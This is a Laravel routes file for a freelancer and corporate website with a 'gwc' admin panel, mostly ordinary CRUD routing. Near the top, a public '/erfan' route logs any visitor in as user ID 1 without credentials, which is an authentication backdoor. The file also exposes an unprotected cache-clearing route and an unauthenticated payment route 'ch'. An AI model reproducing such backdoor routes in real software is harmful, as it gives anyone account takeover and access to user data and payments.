<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;

Route::get('/clear-cache', function() {
    $exitCode = Artisan::call('cache:clear');
    // return what you want
});
Route::get('/erfan', function() {
    Auth::loginUsingId(1);
});

Route::get('freelancer/success', 'Front\PaymentController@success')->name('payment.success');
Route::get('freelancer/fail', 'Front\PaymentController@fail')->name('payment.fail');

Route::get('/set-locale/{locale}', 'Front\LandingController@setLocale');
    Route::get('/', 'Front\LandingController@index');
    Route::get('/login', 'Front\LandingController@loginPage')->name('login.index')->middleware('guest');
    Route::post('/login', 'Front\LandingController@login')->name('login.store')->middleware('guest');
    Route::get('/register', 'Front\LandingController@registerPage')->name('register.index')->middleware('guest');
    Route::post('/register', 'Front\LandingController@register')->name('register.store')->middleware('guest');

Route::middleware(['auth:freelancer'])->namespace('Front')->prefix('freelancer')->group(function () {
    Route::get('/', 'LandingController@packages')->name('packages');
    Route::get('/logout', 'LandingController@logOut')->name('logout');
    Route::post('payment', 'PaymentController@formSubmit')->name('payment');

});
//Auth::routes();


Route::post('/gwc/get-country-Privacy', "WebController@getCountryPrivacy");

Route::namespace('Admin')->prefix('gwc')->group(function () {




//Admin authentication
    Route::get('/', 'AdminAuthController@index');
    Route::post('/login', 'AdminAuthController@login')->name('adminLogin');
    Route::post('/logout', 'AdminAuthController@logout')->name('adminLogout');

    Route::get('/forgot', 'AdminAuthController@forgot');
    Route::post('/email', 'AdminAuthController@sendResetLinkEmail')->name('gwc.email');
    Route::get('/forgot/{token}', 'AdminAuthController@showResetForm')->name('gwc.reset');
    Route::post('/forgot/{token}', 'AdminAuthController@resetPassword')->name('gwc.token');
//dashboard
    Route::get('/home', 'AdminDashboardController@index')->middleware('admin');
});

//admins
Route::namespace('Admin')->prefix('gwc')->middleware('admin')->group(function () {

//admin User
    Route::resource('admins', 'AdminAdminsController');
    Route::post('/admins/{id}', 'AdminAdminsController@update');
    Route::get('/admins/ajax/{id}', 'AdminAdminsController@updateStatusAjax');
    Route::get('/admins/changepass/{id}', 'AdminAdminsController@edit')->name('changePass');
    Route::post('/admins/changepass/{id}', 'AdminAdminsController@adminChangePass')->name('adminChangePass');
    Route::get('/admins/delete/{id}', 'AdminAdminsController@destroy');
    Route::get('/admins/deleteimage/{id}/{field}', 'AdminAdminsController@deleteImage');


    //categories
    Route::get('category/ajax/{id}', 'CategoryController@updateStatusAjax');
    Route::resource('categories', 'CategoryController');
    Route::get('category/delete/{id}', 'CategoryController@destroy');

    //attributes
    Route::resource('attributes', 'AttributeController');
    Route::get('attributes/delete/{id}', 'AttributeController@destroy');

    //attributeGroup
    Route::resource('attribute-groups', 'AttributeGroupController');
    Route::get('attribute-groups/delete/{id}', 'AttributeGroupController@destroy');

    //users
    Route::resource('users', 'AdminUsersController');
     Route::get('users/delete/{id}', 'AdminUsersController@destroy');
    Route::resource('freelancers', 'FreeLancersController');
    Route::get('freelancers/delete/{id}', 'FreeLancersController@destroy');

    Route::get('freelancer/{freelancer_id}/services', 'FreeLancerServicesController@index')->name('services.index');;
    Route::get('freelancer/{freelancer_id}/services/create', 'FreeLancerServicesController@create');
    Route::post('freelancer/{freelancer_id}/services', 'FreeLancerServicesController@store')->name('services.store');
    Route::get('freelancer/{freelancer_id}/services/{service_id}/edit', 'FreeLancerServicesController@edit');
    Route::post('freelancer/{freelancer_id}/services/{service_id}', 'FreeLancerServicesController@update')->name('services.update');
    Route::get('freelancer/{freelancer_id}/services/delete/{service_id}', 'FreeLancerServicesController@destroy')->name('services.destroy');

    Route::resource('packages', 'PackagesController');
    Route::get('packages/delete/{id}', 'PackagesController@destroy');

//subsidiaries
    Route::resource('/subsidiaries', 'AdminSubsidiariesController');
    Route::get('/subsidiaries/ajax/{id}', 'AdminSubsidiariesController@updateStatusAjax');
    Route::post('/subsidiaries/{id}', 'AdminSubsidiariesController@update');
    Route::get('/subsidiaries/deleteimage/{id}/{field}', 'AdminSubsidiariesController@deleteImage');
    Route::get('/subsidiaries/delete/{id}', 'AdminSubsidiariesController@destroy');

    //Possibilities

    Route::resource('/possibilities', 'AdminPossibilitiesController');
    Route::get('/possibilities/ajax/{id}', 'AdminPossibilitiesController@updateStatusAjax');
    Route::post('/possibilities/{id}', 'AdminPossibilitiesController@update');
    Route::get('/possibilities/deleteimage/{id}/{field}', 'AdminPossibilitiesController@deleteImage');
    Route::get('/possibilities/delete/{id}', 'AdminPossibilitiesController@destroy');





    Route::get('slideshows/ajax/{id}', 'SlideshowsController@updateStatusAjax');
    Route::resource('slideshows', 'SlideshowsController');
    Route::resource('howitworks', 'HowItWorksController');
    Route::get('howitworks/delete/{id}', 'HowItWorksController@destroy');
    Route::get('slideshows/delete/{id}', 'SlideshowsController@destroy');

    Route::get('quicklinks/ajax/{id}', 'QuickLinksController@updateStatusAjax');
    Route::resource('quicklinks', 'QuickLinksController');
    Route::get('quicklinks/delete/{id}', 'QuickLinksController@destroy');

    Route::get('/newsletter/{id}', 'AdminUsersController@updateNewsletterAjax');
    Route::get('users/changepass/{id}', 'AdminUsersController@edit')->name('changePass');
    Route::post('users/changepass/{id}', 'AdminUsersController@userChangePass')->name('userChangePass');
    Route::get('users/{id}/address', 'AdminUsersController@address')->name('userChangePass');
    Route::get('/deleteimage/{id}/{field}', 'AdminUsersController@deleteImage');
    Route::get('/delete/{id}', 'AdminUsersController@destroy');
    Route::resource('users/{id}/address', 'AdminUsersAddressController');
    Route::get('users/{id}/wishlist', 'AdminUsersWishListController@index');
    Route::get('users/{id}/wishlist', 'AdminUsersWishListController@index');
    Route::get('users/ajax/{user}', 'AdminUsersController@isActive');
    Route::get('wishlist/ajax/{user}', 'AdminUsersWishListController@addToWishlist');
    Route::get('users/{user_id}/address/delete/{address_id}', 'AdminUsersAddressController@destroy');

//Roles
    Route::resource('/roles', 'AdminRolesController');
    Route::post('/roles/{id}', 'AdminRolesController@update');
    Route::get('/roles/delete/{id}', 'AdminRolesController@destroy');


    //Annual Report
    Route::resource('/annual-reports', 'AdminAnnualReportsController');
    Route::get('/annual-reports/delete/{id}', 'AdminAnnualReportsController@destroy');
    Route::get('/annual-reports/ajax/{id}', 'AdminAnnualReportsController@updateStatusAjax');
    
    Route::resource('/quarterly-reports', 'AdminQuarterlyReportsController');
    Route::get('/quarterly-reports/delete/{id}', 'AdminQuarterlyReportsController@destroy');
    Route::get('/quarterly-reports/ajax/{id}', 'AdminQuarterlyReportsController@updateStatusAjax');
    
    Route::resource('/disclosures', 'AdminDisclosuresController');
    Route::get('/disclosures/delete/{id}', 'AdminDisclosuresController@destroy');

    //settings
    Route::get('settings', 'AdminSettingsController@index');
    Route::post('/settings', 'AdminSettingsController@update')->name('settings.update');
    Route::get('/settings/deleteimage/{field}', 'AdminSettingsController@deleteImage');

    //logs
    Route::resource('/logs', 'AdminLogsController');
    Route::get('/logs/delete/{id}', 'AdminLogsController@destroy');

    //notify emails
    Route::resource('/notifyemails', 'AdminNotifyEmailsController');
    Route::get('/notifyemails' . '/ajax/{id}', 'AdminNotifyEmailsController@updateStatusAjax');
    Route::post('/notifyemails' . '/{id}', 'AdminNotifyEmailsController@update');
    Route::get('/notifyemails' . '/delete/{id}', 'AdminNotifyEmailsController@destroy');

    //sms settings
    Route::get('sms', 'AdminSmsController@index');
    Route::post('/sms', 'AdminSmsController@update')->name('sms.update');

    //subjects
    Route::resource('/subjects', 'AdminSubjectsController');
    Route::get('/subjects/ajax/{id}', 'AdminSubjectsController@updateStatusAjax');
    Route::post('/subjects/{id}', 'AdminSubjectsController@update');
    Route::get('/subjects/delete/{id}', 'AdminSubjectsController@destroy');

    //contact us messages
    Route::resource('/messages', 'AdminMessagesController');
    Route::get('/messages/view/{id}', 'AdminMessagesController@view');
    Route::get('/messages/delete/{id}', 'AdminMessagesController@destroy');
    Route::get('/messages/delete/{id}', 'AdminMessagesController@destroy');

    Route::resource('/educations', 'AdminEducationsController');






    //Contact information
    Route::resource('/contactsinformations', 'AdminContactInfoController');

    Route::get('/contactsinformations/ajax/{id}', 'AdminContactInfoController@updateStatusAjax');
    Route::post('/contactsinformations/{id}', 'AdminContactInfoController@update');
    Route::get('/contactsinformations/delete/{id}', 'AdminContactInfoController@destroy');



    //orders
    Route::resource('/orders', 'AdminOrdersController');
    Route::resource('/user-orders', 'AdminUserOrdersController');
    Route::resource('/user-payments', 'AdminUserOrdersController');
    Route::post('/orders/ajax', 'AdminOrdersController@storeValuesInCookies');
    Route::post('/orders/reset-date-range', 'AdminOrdersController@resetDateRange');
    Route::get('/orders/{id}/view', 'AdminOrdersController@view');
    Route::post('/orders/{id}', 'AdminOrdersController@update');
    Route::get('/orders/delete/{id}', 'AdminOrdersController@destroy');

    // transactions
    Route::resource('/transactions', 'AdminTransactionsController');
    Route::post('/transactions/ajax', 'AdminTransactionsController@storeValuesInCookies');
    Route::post('/transactions/reset-date-range', 'AdminTransactionsController@resetDateRange');
    Route::get('/transactions/{id}/view', 'AdminTransactionsController@view');
    Route::post('/transactions/{id}', 'AdminTransactionsController@update');
    Route::get('/transactions/delete/{id}', 'AdminTransactionsController@destroy');
    Route::post('/{id}', 'AdminUsersController@update');

    //Privacy Policy

    Route::resource('/privacys', 'AdminPrivacyController');

    Route::get('/privacys/ajax/{id}', 'AdminPrivacyController@updateStatusAjax');
    Route::post('/privacys/{id}', 'AdminPrivacyController@update');
    Route::post('/privacys/update-p/{id}', 'AdminPrivacyController@updateP');
    Route::get('/privacys/delete/{id}', 'AdminPrivacyController@destroy');

//webpush
    Route::post('/webpush/save', 'webPushController@saveWebPush')->name('savePush');
    Route::post('/webpush/saveEdit/{id}', 'webPushController@saveEditWebPush')->name('saveEdit');
    Route::get('/webpush/delete/{id}', 'webPushController@destroyWebPushs');
    Route::get('/webpush/devicetokens', 'webPushController@devicetokens');
    Route::get('/webpush/devicetokens/delete/{id}', 'webPushController@deletedevicetokens');
    Route::resource('webpush', 'webPushController');


    //single pages
    Route::resource('/singlepages', 'AdminSinglePagesController');
    Route::post('/singlepages/post', 'AdminSinglePagesController@storeSinglePage');
    Route::get('/singlepages/ajax/{id}', 'AdminSinglePagesController@updateStatusAjax');
    Route::post('/singlepages/{id}', 'AdminSinglePagesController@update');
    Route::get('/singlepages/deleteimage/{id}/{field}', 'AdminSinglePagesController@deleteImage');
    Route::get('/singlepages/delete/{id}', 'AdminSinglePagesController@destroy');

    Route::get('/corporateoverview', 'AdminCorporateOverviewController@index');
    Route::get('/corporateoverview/create', 'AdminCorporateOverviewController@create');
    Route::post('/corporateoverview/store', 'AdminCorporateOverviewController@store');
    Route::get('/corporateoverview/delete/{id}', 'AdminCorporateOverviewController@destroy');
    Route::get('/corporateoverview/ajax/{id}', 'AdminCorporateOverviewController@updateStatusAjax');
    Route::post('/corporateoverview/{id}/update', 'AdminCorporateOverviewController@update')->name('corporateoverview.update');
    Route::get('/corporateoverview/{id}/edit', 'AdminCorporateOverviewController@edit');
//    Route::post('/corporateoverview/{id}', 'AdminCorporateOverviewController@update');
//    Route::get('/corporateoverview/deleteimage/{id}/{field}', 'AdminCorporateOverviewController@deleteImage');

    //news
    Route::resource('/news', 'AdminNewsController');
    Route::post('/news/post', 'AdminNewsController@storeNews');
    Route::get('/news/ajax/{id}', 'AdminNewsController@updateStatusAjax');
    Route::post('/news/{id}', 'AdminNewsController@update');
    Route::get('/news/deleteimage/{id}/{field}', 'AdminNewsController@deleteImage');
    Route::get('/news/delete/{id}', 'AdminNewsController@destroy');

    //resume
    Route::resource('/resumes', 'AdminResumeController');
     Route::post('/resumes/post', 'AdminResumeController@storeResume');
     Route::get('/resumes/ajax/{id}', 'AdminResumeController@updateStatusAjax');
    Route::post('/resumes/{id}', 'AdminResumeController@update');
     Route::get('/resumes/deleteimage/{id}/{field}', 'AdminResumeController@deleteImage');
    Route::get('/resumes/delete/{id}', 'AdminResumeController@destroy');

    //resume
    Route::resource('/vacancies', 'AdminVacanciesController');
    Route::post('/vacancies/post', 'AdminVacanciesController@store')->name('vacancies.store');
    Route::get('/vacancies/delete/{id}', 'AdminVacanciesController@destroy');

//       //category country
//       Route::resource('/categorycountrey', 'AdminCategoryCountryController');
//       Route::post('/categorycountrey/post', 'AdminCategoryCountryController@storeCategoryCountry');
//       Route::get('/categorycountrey/ajax/{id}', 'AdminCategoryCountryControllerr@updateStatusAjax');
//      Route::post('/categorycountrey/{id}', 'AdminCategoryCountryController@update');
//      Route::get('/categorycountrey/delete/{id}', 'AdminCategoryCountryController@destroy');

//      //single page menu
       Route::post('/single-page-menu/post', 'AdminSinglepageMenuController@storeSinglePageMenu')->name('store.single-page');
       Route::get('/single-page-menu/ajax/{id}', 'AdminSinglepageMenuControllerr@updateStatusAjax');
      Route::post('/single-page-menu/{id}', 'AdminSinglepageMenuController@update');
      Route::get('/single-page-menu/delete/{id}', 'AdminSinglepageMenuController@destroy');
      Route::resource('/single-page-menu', 'AdminSinglepageMenuController');

    //services
    Route::resource('/services', 'ServiceController');
    Route::post('/services/storeService/', 'ServiceController@insertSerives')->name('insert.service');
    Route::get('/services/ajax/{id}', 'ServiceController@updateStatusAjax');
    Route::post('/services/{id}', 'ServiceController@update');
    Route::get('/services/delete/{id}', 'ServiceController@destroy');

});
//save token
//Route::get('/web_push_token_save', 'webPushController@saveToken');

Route::post('/dropzone/image', 'DropzoneController@store')->name('dropzone.images.store');
Route::post('/dropzone/image/delete', 'DropzoneController@destroy')->name('dropzone.image.delete');
Route::post('/dropzone/image/remove', 'DropzoneController@store')->name('dropzone.images.remove');



//////////////////////////////////////////////////WEBSITE//////////////////////////////////////////////////
Route::get('/', 'WebController@home');

Route::get('/category/{id}/{title}', 'WebController@categorySinglePage')->name('category.singlepage');
Route::get('/category-form/{id}/{slug}', 'WebController@categorySinglePageWithForm')->name('category.singlepage.form');
Route::get('/news-events/{id}/{title}', 'WebController@NewsAndEventSinglePage')->name('news.singlepage');
Route::get('/news-events', 'WebController@NewsAndEvent')->name('news.events');
Route::get('/contact-us', 'WebController@contactUs')->name('contactus');
Route::post('/contact-us', 'WebController@contactUsStore')->name('contactus.post');
Route::post('/contact-us-page', 'WebController@contactUsStorePage')->name('contactus.post.page');
Route::post('/educations', 'WebController@educationStore')->name('educations.post');
Route::get('/annual/download/{id}', 'Admin\AdminAnnualReportsController@download')->name('annual.download');
Route::get('/quarterly/download/{id}', 'Admin\AdminQuarterlyReportsController@download')->name('quarterly.download');
Route::get('/disclosure/download/{id}', 'Admin\AdminDisclosuresController@download')->name('disclosures.download');
Route::get('/annual', 'WebController@annualReport')->name('annual.web');
Route::get('/quarterly', 'WebController@quarterlyReport')->name('quarterly.web');
Route::get('/available-vacancies', 'WebController@availableVacancies')->name('available.vacancies');
Route::get('/available-vacancies/{id}', 'WebController@availableVacanciesSingle')->name('available.vacancies.single');
Route::post('/available-vacancies/{id}', 'WebController@availableVacanciesPost')->name('available.vacancies.post');
Route::get('/resume/download/{id}', 'WebController@resumeDownload')->name('resume.download');
Route::get('/education/download/{id}', 'WebController@educationDownload')->name('education.download');
Route::get('/disclosures', 'WebController@disclosures')->name('disclosures');
Route::get('/disclosures/{id}', 'WebController@disclosuresSingle')->name('disclosures.single');


Route::get('locale/{locale}', function ($locale) {
    Session::put('locale', $locale);
    App::setLocale($locale);
    return redirect()->back();
});



////user authentication
//Route::get('/user/forgot', 'UserAuthController@forgot');
//Route::post('user/email', 'UserAuthController@sendResetLinkEmail')->name('user.email');
//Route::get('user/forgot/{token}', 'UserAuthController@showResetForm')->name('user.reset');
//Route::post('user/forgot/{token}', 'UserAuthController@resetPassword')->name('user.token');
//
//
//Route::get('/subscribe/{code}', 'WebController@subscribe');
//
//Route::post('/pay', 'WebController@pay')->name('pay');
//Route::post('/knet-response', 'WebController@knetResponse')->name('knetResponse');
//Route::get('/knet-status', 'WebController@knetStatus')->name('knetStatus');
//
//Route::get('/trackorder', 'WebController@trackOrder');
//Route::post('/trackorder', 'WebController@trackOrder');
//
//Route::get('/about', 'WebController@about')->name('about');
//
//Route::get('/contact', 'WebController@contact')->name('contact');
//Route::post('/contactsubmit', 'WebController@contactSubmit')->name('contactsubmit');
//
//Route::get("/refreshcaptcha", "WebController@refreshCaptcha");

Route::get('ch', 'Front\PaymentController@formSubmit');


Route::get('my-captcha', 'WebController@myCaptcha')->name('myCaptcha');
Route::post('my-captcha', 'WebController@myCaptchaPost')->name('myCaptcha.post');
Route::get('refresh_captcha', 'WebController@refreshCaptcha')->name('refresh_captcha');
